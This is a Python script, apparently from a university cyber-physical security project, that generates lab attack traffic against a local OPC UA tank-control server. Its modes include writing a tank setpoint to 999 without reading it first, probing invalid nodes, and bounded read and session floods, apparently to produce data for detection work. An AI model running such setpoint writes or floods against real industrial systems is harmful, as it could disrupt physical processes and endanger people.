"""
Controlled lab traffic generator for the CS5390 project.
Use only against your own local/isolated OPC UA server.

Examples:
  python3 opcua_attacker.py --attack invalid_node
  python3 opcua_attacker.py --attack write_no_read
  python3 opcua_attacker.py --attack value_jump
  python3 opcua_attacker.py --attack read_flood
  python3 opcua_attacker.py --attack session_flood
"""

import argparse
import asyncio

from asyncua import Client, ua

NAMESPACE_URI = "urn:cps-project:modbus-opcua-gateway"


async def get_process_nodes(client):
    idx = await client.get_namespace_index(NAMESPACE_URI)
    process = await client.nodes.root.get_child(
        ["0:Objects", f"{idx}:TankProcess"]
    )
    tank_level = await process.get_child(f"{idx}:TankLevel")
    setpoint = await process.get_child(f"{idx}:Setpoint")
    return idx, tank_level, setpoint


async def invalid_node(url):
    async with Client(url=url) as client:
        idx = await client.get_namespace_index(NAMESPACE_URI)
        node = client.get_node(f"ns={idx};s=DefinitelyNotARealNode")
        try:
            await node.read_value()
        except Exception as exc:
            print(f"[invalid_node] server rejected nonexistent node: {type(exc).__name__}: {exc}")


async def write_no_read(url):
    async with Client(url=url) as client:
        _, _, setpoint = await get_process_nodes(client)
        # No value read from Setpoint before the write.
        await setpoint.write_value(ua.UInt16(500))
        print("[write_no_read] wrote Setpoint=500 without reading its value first")


async def value_jump(url):
    async with Client(url=url) as client:
        _, _, setpoint = await get_process_nodes(client)
        old = int(await setpoint.read_value())
        await setpoint.write_value(ua.UInt16(999))
        print(f"[value_jump] Setpoint jumped from {old} to 999")


async def read_flood(url, count=50):
    async with Client(url=url) as client:
        _, tank_level, _ = await get_process_nodes(client)
        for _ in range(count):
            await tank_level.read_value()
        print(f"[read_flood] sent {count} back-to-back reads")


async def one_session(url):
    try:
        async with Client(url=url) as client:
            await asyncio.sleep(0.02)
    except Exception as exc:
        print(f"[session_flood] one connection failed: {exc}")


async def session_flood(url, count=20):
    # Deliberately bounded for a local class lab.
    await asyncio.gather(*(one_session(url) for _ in range(count)))
    print(f"[session_flood] opened {count} short-lived sessions/connections")


ATTACKS = {
    "invalid_node": invalid_node,
    "write_no_read": write_no_read,
    "value_jump": value_jump,
    "read_flood": read_flood,
    "session_flood": session_flood,
}


async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="opc.tcp://127.0.0.1:4840/cps/")
    parser.add_argument("--attack", choices=list(ATTACKS) + ["all"], default="all")
    parser.add_argument("--count", type=int, default=None)
    args = parser.parse_args()

    names = list(ATTACKS) if args.attack == "all" else [args.attack]
    for name in names:
        print(f"\n=== running: {name} ===")
        if name == "read_flood" and args.count is not None:
            await read_flood(args.url, max(1, min(args.count, 200)))
        elif name == "session_flood" and args.count is not None:
            await session_flood(args.url, max(1, min(args.count, 50)))
        else:
            await ATTACKS[name](args.url)
        await asyncio.sleep(1.0)


if __name__ == "__main__":
    asyncio.run(main())
